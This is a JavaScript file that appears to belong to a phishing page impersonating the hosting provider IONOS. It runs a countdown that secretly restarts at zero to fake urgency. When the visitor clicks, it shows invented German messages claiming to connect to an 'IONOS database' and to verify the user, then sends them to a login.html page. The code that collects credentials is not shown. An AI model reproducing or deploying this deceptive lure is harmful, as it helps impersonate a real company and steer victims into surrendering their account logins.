 // Countdown functionality
 let totalSeconds = 2 * 3600 + 15 * 60 + 30; // 2 hours, 15 minutes, 30 seconds

 function updateCountdown() {
   const hours = Math.floor(totalSeconds / 3600);
   const minutes = Math.floor((totalSeconds % 3600) / 60);
   const seconds = totalSeconds % 60;

   document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
   document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
   document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');

   if (totalSeconds > 0) {
     totalSeconds--;
   } else {
     // Reset countdown when it reaches zero
     totalSeconds = 2 * 3600 + 15 * 60 + 30;
   }
 }

 // Update countdown every second
 updateCountdown();
 setInterval(updateCountdown, 1000);

 // Enhanced button click handler with improved spinner management
 document.querySelector('.protect-link').addEventListener('click', function(e) {
   e.preventDefault();
   
   // Show spinner overlay with fade in
   const spinnerOverlay = document.getElementById('spinnerOverlay');
   const spinnerText = document.getElementById('spinnerText');
   const container = document.querySelector('.container');
   
   spinnerOverlay.style.display = 'flex';
   spinnerOverlay.style.animation = 'fadeIn 0.5s ease-out';
   
   // Add blur effect to main container
   container.classList.add('blur');
   
   // Add fade-in class to spinner container
   setTimeout(() => {
     const spinnerContainer = document.querySelector('.spinner-container');
     spinnerContainer.classList.add('fade-in');
   }, 100);
   
   // First message for 4 seconds
   spinnerText.textContent = 'Verbindung zur IONOS-Datenbank herstellen';
   
   // Change to second message after 4 seconds
   const messageTimeout = setTimeout(() => {
     spinnerText.textContent = 'Verifizierung dieses Benutzers';
   }, 4000);
   
   // Hide spinner with fade out after 7 seconds, then redirect
   const hideTimeout = setTimeout(() => {
     spinnerOverlay.style.animation = 'fadeOut 0.5s ease-in';
     container.classList.remove('blur');
     
     // Wait for fade out animation to complete before redirecting
     setTimeout(() => {
       spinnerOverlay.style.display = 'none';
       spinnerOverlay.style.animation = ''; // Reset animation
       window.location.href = 'login.html';
     }, 500);
   }, 7000);
   
   // Store timeout IDs for potential cleanup
   window.spinnerTimeouts = [messageTimeout, hideTimeout];
 });

 // Cleanup function to clear timeouts if user navigates away
 window.addEventListener('beforeunload', function() {
   if (window.spinnerTimeouts) {
     window.spinnerTimeouts.forEach(timeout => clearTimeout(timeout));
   }
   
   // Ensure spinner is hidden and blur is removed
   const spinnerOverlay = document.getElementById('spinnerOverlay');
   const container = document.querySelector('.container');
   
   if (spinnerOverlay) {
     spinnerOverlay.style.display = 'none';
     spinnerOverlay.style.animation = '';
   }
   
   if (container) {
     container.classList.remove('blur');
   }
 });